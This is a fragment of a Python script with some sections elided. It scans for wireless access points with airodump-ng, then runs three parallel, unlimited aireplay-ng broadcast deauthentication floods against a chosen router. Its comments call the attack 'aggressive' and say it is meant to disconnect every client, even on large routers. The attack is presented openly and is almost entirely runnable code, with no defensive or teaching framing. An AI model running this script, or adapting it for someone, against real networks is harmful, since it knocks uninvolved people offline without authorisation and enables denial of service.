...
# We run the iwconfig command to look for wireless interfaces.
# Discover access points (scanning both 2.4GHz and 5GHz bands)
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", "--band", "abg", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
...
print("[*] Targeting all clients on the network")
print("[*] Press Ctrl+C to stop the attack\n")

# Aggressive deauthentication attack - multiple processes for maximum effectiveness
# We'll run multiple aireplay-ng instances simultaneously for heavy attack on large routers
try:
    # Start multiple deauth processes for more aggressive attack
    deauth_processes = []
    
    # Process 1: Broadcast deauth (targets all clients)
    p1 = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    deauth_processes.append(p1)
    
    # Process 2: Additional deauth stream for increased packet rate
    p2 = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    deauth_processes.append(p2)
    
    # Process 3: Third stream for even more aggressive attack
    p3 = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    deauth_processes.append(p3)
    
    print("[*] Attack is running with multiple streams...")
    print("[*] This should be effective even on large routers\n")
    
    # Keep the processes running
    for p in deauth_processes:
        p.wait()
